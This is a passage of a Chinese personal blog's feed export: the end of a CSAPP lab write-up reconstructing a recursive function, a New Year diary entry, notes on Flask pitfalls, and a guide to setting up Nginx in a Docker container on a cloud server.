<figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div></pre></td><td class="code"><pre><div class="line"><span class="comment">//这里假设%rdi为x, %esi为y</span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">fun7</span><span class="params">(<span class="keyword">int</span> *x, <span class="keyword">int</span> y)</span></span></div><div class="line">&#123;</div><div class="line">	<span class="keyword">if</span> (x == <span class="literal">NULL</span>)</div><div class="line">		<span class="keyword">return</span> <span class="number">-1</span>;</div><div class="line">	<span class="keyword">int</span> ret = <span class="number">0</span>;</div><div class="line">	<span class="keyword">if</span> (*x - y &lt; <span class="number">0</span>)</div><div class="line">	&#123;</div><div class="line">		ret = fun7(*(x + <span class="number">0x10</span>), y);</div><div class="line">		ret = ret * <span class="number">2</span> + <span class="number">1</span>;</div><div class="line">	&#125;	</div><div class="line">	<span class="keyword">else</span> <span class="keyword">if</span> (*x == y)</div><div class="line">	&#123;</div><div class="line">		<span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">	&#125;</div><div class="line">	<span class="keyword">else</span></div><div class="line">	&#123;</div><div class="line">		ret = fun7(*(x + <span class="number">0x8</span>), b);</div><div class="line">		ret *= <span class="number">2</span>;</div><div class="line">	&#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>那么，为了让fun7返回得到2，需要执行三次递归。</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">2 = 2 * 1</div><div class="line">1 = 2 * 0 + 1</div><div class="line">0 = 0</div></pre></td></tr></table></figure>
<p>所以可以得知%rdi也就是0x6030f0这个地址进行了2次增加。递归最深处得到(%rdi)和%rsi相等。用0x6030f0增加(0x8+0x10),得到<code>0x16</code>,转化为十进制就是答案<code>22</code>.</p>
<p><img src="suc.png" alt=""></p>
<h1 id="u6700_u540E"><a href="#u6700_u540E" class="headerlink" title="最后"></a>最后</h1><p>通过不到两天的思考，虽然不是很容易，经过各种查资料和思考，最终完成了这个lab。第三章节的结束，也是第四章的开始，路漫漫其修远兮，吾将上下而求索。</p>
]]></content>
    
    <summary type="html">
    
      csapp
    
    </summary>
    
    
      <category term="csapp" scheme="http://xinqiu.me/tags/csapp/"/>
    
  </entry>
  
  <entry>
    <title>2016的第一篇日记</title>
    <link href="http://xinqiu.me/2016/01/01/Dairy-5/"/>
    <id>http://xinqiu.me/2016/01/01/Dairy-5/</id>
    <published>2015-12-31T16:00:00.000Z</published>
    <updated>2016-02-11T05:11:24.000Z</updated>
    
    <content type="html"><![CDATA[<p>今天是2016年的第一天，想起来本该在昨天做一个年终总结的，没想到被耽搁了。今天就简单做个总结并记录一些新年的计划吧。</p>
<p>突然发现自己对2015年的玩乐记忆不是很多，留在心里的就是吃了两次比较好吃的日料(原谅我是个吃货)。</p>
<p>其实细细想想，这一年已经让我与名校的学生拉开了很大的差距，说实话，我并没做到挑灯夜战到凌晨一两点。我仅仅能做到几乎不晚游戏和坚持除周末外的早起背单词。曾经的热血方刚如今变成靠毅力来坚持走实现理想的路。编程这块真的是有个大牛带才会轻松一点，一个人的路真心不好走。</p>
<p>随着python的学习越来越深入，说实话我挺喜欢这个语言的。人生苦短，我用python。无奈学校的路线是Java，为了应付学校的课程安排，只得将学python的一部分尽量稍微用在了点Java上。</p>
<p>过去的一年，收获是有，但总觉得不足。</p>
<p>只希望新的一年里，能看完CSAPP并刷一遍labs，看点SICP和CLRS，刷一遍Leetcode。C++可以再拿起来看看了。业余小活动，就花在点iOS开发上吧。</p>
<p>以上。</p>
]]></content>
    
    <summary type="html">
    
      Hello 2016
    
    </summary>
    
    
      <category term="MyLife" scheme="http://xinqiu.me/tags/MyLife/"/>
    
  </entry>
  
  <entry>
    <title>Flask补坑记录</title>
    <link href="http://xinqiu.me/2015/12/21/Learn-Flask/"/>
    <id>http://xinqiu.me/2015/12/21/Learn-Flask/</id>
    <published>2015-12-20T16:00:00.000Z</published>
    <updated>2016-02-15T01:38:13.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="u524D_u8A00"><a href="#u524D_u8A00" class="headerlink" title="前言"></a>前言</h2><p>不得不说，Flask是个不错的框架，它很简洁，然而却不失强大。在我阅读 &lt;&lt; Flask Web Development &gt;&gt; 这本书的过程中，我觉得最好是这本书的配套源码和issues。在这些帮助下，一步步从完全不了解Flask到稍微知道Flask的工作原理。这过程中有好多次因为一些小细节的错误debug个很久。在此，我记录了一些我遇到的问题，方便大家看看。</p>
<a id="more"></a>
<h2 id="u6570_u636E_u5E93"><a href="#u6570_u636E_u5E93" class="headerlink" title="数据库"></a>数据库</h2><h3 id="u8FC1_u79FB_u76F8_u5173_u95EE_u9898"><a href="#u8FC1_u79FB_u76F8_u5173_u95EE_u9898" class="headerlink" title="迁移相关问题"></a>迁移相关问题</h3><p>Flask提供了一个库Flask-SQLAlchemy。这个库大大的简化了数据库的操作，不需要手写数据库语句。配合数据库迁移的库Flask-Migrate,功能会非常强大。然而，在我尝试迁移数据库的时候，经常出现一个现象。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">python manager.py db upgrade</div><div class="line"></div><div class="line">INFO  [alembic.migration] Context impl SQLiteImpl.</div><div class="line">INFO  [alembic.migration] Will assume non-transactional DDL.</div></pre></td></tr></table></figure>
<p>总之就是并没有迁移成功。</p>
<p>后来发现, 如果在<code>upgrade</code>之前<code>migrate</code>一下就可以解决问题了。</p>
<h3 id="u6743_u9650_u95EE_u9898"><a href="#u6743_u9650_u95EE_u9898" class="headerlink" title="权限问题"></a>权限问题</h3><p>因为学习Flask是断断续续的，不可避免的就是遇到问题要不停的回滚。结果就是对数据库的操作存在一些隐形问题。在做到11章时，一个问题浮现了出来，就是登陆以后的用户并不能发post。在代码审计了很久都没有发现问题的时候，无意间看到了一个issue，和我遇到了一样的问题。原因是因为Role角色没写进数据库中，所以注册的用户并没有权限。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">python manage.py shell</div><div class="line">&gt;&gt;&gt; Role.insert_roles()</div><div class="line">&gt;&gt;&gt; Role.query.all() <span class="comment">#应该能看到下面的三种角色</span></div><div class="line">[&lt;Role u<span class="string">'Administrator'</span>&gt;, &lt;Role u<span class="string">'User'</span>&gt;, &lt;Role u<span class="string">'Moderator'</span>&gt;]</div></pre></td></tr></table></figure>
<p>当初觉得这个很麻烦，在书的后面，给出了解决方法，就是在部署的时候，直接执行insert_roles()，省去了Shell里的这一步。</p>
<h2 id="u90AE_u4EF6"><a href="#u90AE_u4EF6" class="headerlink" title="邮件"></a>邮件</h2><p>邮件操作让我折腾了一两天，换了163，126，qq。刚才是都没成功。错误代码<code>530，Authentication Required.</code>明明邮箱密码并没有输错呀。后来仔细想了想，发现不管是QQ还是网易，在使用第三方Mail接收客户端的时候，使用的密码并不是邮箱密码，而是一个授权码。在使用授权码成功发送了一篇邮件以后，心里顿时舒坦多了，也预示着Flask小网站完成了一大半了。</p>
<h2 id="u4E00_u4E9B_u77E5_u8BC6_u70B9_u7684_u8BB0_u5F55"><a href="#u4E00_u4E9B_u77E5_u8BC6_u70B9_u7684_u8BB0_u5F55" class="headerlink" title="一些知识点的记录"></a>一些知识点的记录</h2><h3 id="url_for"><a href="#url_for" class="headerlink" title="url_for"></a>url_for</h3><p>因为Flask使用的是<code>jinja2</code>模板, 其中网页跳转使用了url_for函数。当初在学Blueprint的时候并没细细思考蓝图的一些原理，当初用url_for也没怎么注意。在某个瞬间，突然发现url_for有的时候用了<code>.</code>，有时却没用。这是为什么呢？</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">Additionally if you are in a view function of a blueprint or</div><div class="line">a rendered template and you want to link to another endpoint of the same blueprint, </div><div class="line">you can use relative redirects by </div><div class="line">prefixing the endpoint with a dot only</div></pre></td></tr></table></figure>
<p>简而言之就是，这里的点其实省略了当前蓝图的名字。</p>
<h2 id="u603B_u7ED3"><a href="#u603B_u7ED3" class="headerlink" title="总结"></a>总结</h2><p>Flask真心不错，很适合学完了Python，却又不知道该拿python去做个什么简单的项目。打算之后做个Flask博客试试，到时候再继续补坑。最近突然想刷算法题目了233.</p>
]]></content>
    
    <summary type="html">
    
      Flask
    
    </summary>
    
    
      <category term="python" scheme="http://xinqiu.me/tags/python/"/>
    
  </entry>
  
  <entry>
    <title>云主机下的docker+Nginx搭建</title>
    <link href="http://xinqiu.me/2015/11/13/docker+nginx/"/>
    <id>http://xinqiu.me/2015/11/13/docker+nginx/</id>
    <published>2015-11-12T16:00:00.000Z</published>
    <updated>2016-02-11T05:03:49.000Z</updated>
    
    <content type="html"><![CDATA[<blockquote>
<p>之前申请到了腾讯云服务器，所以在上面折腾了一下 Nginx。</p>
</blockquote>
<h2 id="u51C6_u5907_u5DE5_u4F5C"><a href="#u51C6_u5907_u5DE5_u4F5C" class="headerlink" title="准备工作"></a>准备工作</h2><h3 id="u7CFB_u7EDF_u914D_u7F6E"><a href="#u7CFB_u7EDF_u914D_u7F6E" class="headerlink" title="系统配置"></a>系统配置</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">操作系统	Ubuntu Server 14.04.1 LTS 64位</div><div class="line">CPU	1核</div><div class="line">内存	1GB</div><div class="line">系统盘	8GB(本地盘)</div><div class="line">数据盘	0GB</div><div class="line">公网带宽	1Mbps</div></pre></td></tr></table></figure>
<a id="more"></a>
<h3 id="u7CFB_u7EDF_u955C_u50CF"><a href="#u7CFB_u7EDF_u955C_u50CF" class="headerlink" title="系统镜像"></a>系统镜像</h3><p>一开始拿 Ubuntu 装 docker，结果启动后会出点小问题，所以就决定用腾讯云提供的系统镜像了。</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"></div><div class="line">镜像名称	Docker运行环境（Ubuntu 14.04 64位）</div><div class="line">类型	镜像市场镜像</div><div class="line">镜像ID	img-3lj3495x</div></pre></td></tr></table></figure>
<h2 id="docker__u4F7F_u7528"><a href="#docker__u4F7F_u7528" class="headerlink" title="docker 使用"></a>docker 使用</h2><p>用 ssh 连接主机，在终端里输入</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">docker -v</div></pre></td></tr></table></figure>
<p>可以查看 docker 的版本，我这里的版本是<code>Docker version 1.8.2 build 0a8c2e3</code></p>
<p>使用命令</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">docekr search nginx</div></pre></td></tr></table></figure>
<p>可以搜索 nginx 仓库。</p>
<p><strong>注：如果发现 docker 使用会存在问题，可以使用 sudo -s 提权为 root</strong></p>
<p>使用官方的 nginx 仓库</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">docker pull nginx</div></pre></td></tr></table></figure>
<p>pull 好以后，就可以正式启动 nginx 容器了。</p>
<p>官方的 nginx 容器里，连 vim 都没有，这是个比较苦恼的事情，所以可以先启动容器进入交互界面安装 vim。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">docker run -t -i -p 80:80 nginx /bin/bash</div></pre></td></tr></table></figure>
<p>这里进入的是 bash，<code>-p 80:80</code> 是将容器里的80端口与主机的80端口进行绑定。</p>
<p>进入容器后，会发现并不能访问容器里的 nginx 欢迎界面，这是因为 nginx 服务并没有启动。</p>
<p>使用命令</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">service nginx start</div></pre></td></tr></table></figure>
<p>就可以启动 nginx 服务了。</p>
<p>为了安装 vim，首先需要使用命令更新源。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">apt-get update</div></pre></td></tr></table></figure>
<p>接着使用命令</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">apt-get install vim</div></pre></td></tr></table></figure>
<p>中途敲 <code>y</code> 确定安装。</p>
<p>安装完以后就可以使用了。</p>
<h2 id="docker__u5E38_u7528_u547D_u4EE4"><a href="#docker__u5E38_u7528_u547D_u4EE4" class="headerlink" title="docker 常用命令"></a>docker 常用命令</h2><p>附加到一个已运行的容器</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">docker attach ID</div></pre></td></tr></table></figure>
<p>停止一个容器</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">docker stop Name/ID</div></pre></td></tr></table></figure>
<p>杀死一个容器</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">docker <span class="built_in">kill</span> Name/ID</div></pre></td></tr></table></figure>
<p>保存对容器的修改</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">docker commit ID new_image_name</div></pre></td></tr></table></figure>
<p>列出当前所有正在运行的container</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">docker ps</div></pre></td></tr></table></figure>
<p>列出所有container</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">docker ps <span class="_">-a</span></div></pre></td></tr></table></figure>
<p>删除镜像</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">docker rmi image_name</div></pre></td></tr></table></figure>
<h2 id="Nginx__u5BB9_u5668_u591A_u57DF_u540D_u7ED1_u5B9A"><a href="#Nginx__u5BB9_u5668_u591A_u57DF_u540D_u7ED1_u5B9A" class="headerlink" title="Nginx 容器多域名绑定"></a>Nginx 容器多域名绑定</h2><p>在 docker Nginx 容器中，网站文件夹位于 <code>/usr/share/nginx</code>, 默认的欢迎页面在 <code>/usr/share/nginx/html</code> 中。</p>
<p>一般，如果域名绑定云服务器，那么访问域名访问的是 Nginx container 默认网站。如果先添加二级域名，访问同一个容器中的另一个网站，可以进行一下操作。</p>
<p>Nginx 的配置文件在 <code>/etc/nginx</code> 文件夹里。配置文件在 <code>conf.d</code> 文件夹里。<code>default.conf</code> 为默认网站的配置。添加站点在 <code>conf.d</code> 文件夹中，可以新建一个 <code>.conf</code> 文件，例如site1.conf：</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line">server &#123;</div><div class="line">    listen       80;</div><div class="line">    server_name  此处填写你的二级域名;</div><div class="line"></div><div class="line">    #charset koi8-r;</div><div class="line">    #access_log  /var/log/nginx/log/host.access.log  main;</div><div class="line"></div><div class="line">    location / &#123;</div><div class="line">        root   /usr/share/nginx/about;</div><div class="line">        index  index.html index.htm;</div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>如果这时候你就重启 nginx 服务，可能会启动失败，出现一下问题</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">could not build the server_names_hash, you should increase</div></pre></td></tr></table></figure>
<p>这是因为 <code>/etc/nginx/nginx.conf</code> 文件没有修改好。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">vim /etc/nginx/nginx.conf</div></pre></td></tr></table></figure>
<p>找到 <code>server_names_hash_max_size</code> 这行，将后面的数字改为 <code>512</code> ，将下一行的 <code>server_names_hash_bucket_size</code> 后面的数字改为 <code>128</code> 。</p>
<p>这时重启 Nginx 服务，就可以正常运行了。</p>
]]></content>
    
    <summary type="html">
    
      docker Nginx 
    
    </summary>
    
    
      <category term="docker" scheme="http://xinqiu.me/tags/docker/"/>
    
      <category term="nginx" scheme="http://xinqiu.me/tags/nginx/"/>
    
  </entry>
  
</feed>
